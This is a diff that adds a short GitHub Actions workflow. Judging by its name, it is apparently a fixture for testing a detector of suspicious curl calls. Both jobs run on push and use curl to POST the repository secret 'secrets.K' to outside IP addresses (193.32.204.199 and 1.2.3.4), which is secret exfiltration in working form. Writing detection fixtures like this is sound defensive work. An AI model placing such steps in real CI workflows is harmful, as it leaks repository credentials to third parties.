@@ -1,0 +1,13 @@
+name: violation_ip_after_unknown_flag
+on: push
+jobs:
+  http11:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl --http1.1 -s -X POST -d "t=${{ secrets.K }}" 193.32.204.199
+  trenc:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl --tr-encoding 1.2.3.4 -d "t=${{ secrets.K }}"
